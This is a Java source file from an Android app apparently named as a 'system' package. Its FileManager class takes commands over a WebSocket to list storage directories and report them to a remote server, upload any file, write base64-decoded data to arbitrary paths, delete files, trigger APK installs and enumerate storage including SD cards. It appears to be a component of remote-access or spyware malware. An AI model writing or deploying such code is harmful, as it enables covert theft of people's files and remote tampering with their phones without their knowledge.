package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import androidx.core.content.FileProvider;

import com.xrc.system.core.Constants;
import com.xrc.system.network.FileUploader;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class FileManager {
    private static final String TAG = Constants.TAG + ":File";
    private static FileManager instance;
    private final Context ctx;

    private FileManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized FileManager get(Context ctx) {
        if (instance == null) {
            instance = new FileManager(ctx);
        }
        return instance;
    }

    public void listDirectory(String path) {
        File dir = new File(path);
        if (!dir.exists()) {
            dir = Environment.getExternalStorageDirectory();
        }
        File[] files = dir.listFiles();
        JSONArray arr = new JSONArray();
        if (files != null) {
            for (File f : files) {
                JSONObject obj = new JSONObject();
                try {
                    obj.put("name", f.getName());
                    obj.put("path", f.getAbsolutePath());
                    obj.put("size", f.length());
                    obj.put("isDir", f.isDirectory());
                    obj.put("lastMod", f.lastModified());
                    obj.put("canRead", f.canRead());
                    obj.put("canWrite", f.canWrite());
                    arr.put(obj);
                } catch (JSONException e) {
                    Log.e(TAG, "File JSON failed", e);
                }
            }
        }
        try {
            JSONObject data = new JSONObject();
            data.put("path", dir.getAbsolutePath());
            data.put("files", arr);
            WebSocketClient.get(ctx).sendEvent("file_list", data);
        } catch (JSONException e) {
            Log.e(TAG, "List send failed", e);
        }
    }

    public void uploadFile(String path) {
        new FileUploader(ctx).uploadFile(path);
    }

    public void writeFile(String path, String b64Data) {
        try {
            File file = new File(path);
            File parent = file.getParentFile();
            if (parent != null && !parent.exists()) parent.mkdirs();
            byte[] data = android.util.Base64.decode(b64Data, android.util.Base64.NO_WRAP);
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(data);
            fos.close();
            JSONObject resp = new JSONObject();
            resp.put("path", path);
            resp.put("size", data.length);
            resp.put("status", "written");
            WebSocketClient.get(ctx).sendEvent("file_written", resp);
        } catch (Exception e) {
            Log.e(TAG, "Write failed", e);
        }
    }

    public void deleteFile(String path) {
        File file = new File(path);
        boolean deleted = file.delete();
        try {
            JSONObject resp = new JSONObject();
            resp.put("path", path);
            resp.put("deleted", deleted);
            WebSocketClient.get(ctx).sendEvent("file_deleted", resp);
        } catch (JSONException e) {
            Log.e(TAG, "Delete send failed", e);
        }
    }

    public void installApk(String path) {
        try {
            File file = new File(path);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            Uri uri;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                uri = FileProvider.getUriForFile(ctx, ctx.getPackageName() + ".provider", file);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            } else {
                uri = Uri.fromFile(file);
            }
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Install failed", e);
        }
    }

    public List<String> traverseStorage() {
        List<String> paths = new ArrayList<>();
        paths.add(Environment.getExternalStorageDirectory().getAbsolutePath());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            File[] dirs = ctx.getExternalFilesDirs(null);
            for (File d : dirs) {
                if (d != null) paths.add(d.getAbsolutePath());
            }
        }
        File sd = new File("/storage/sdcard1");
        if (sd.exists()) paths.add(sd.getAbsolutePath());
        return paths;
    }
}
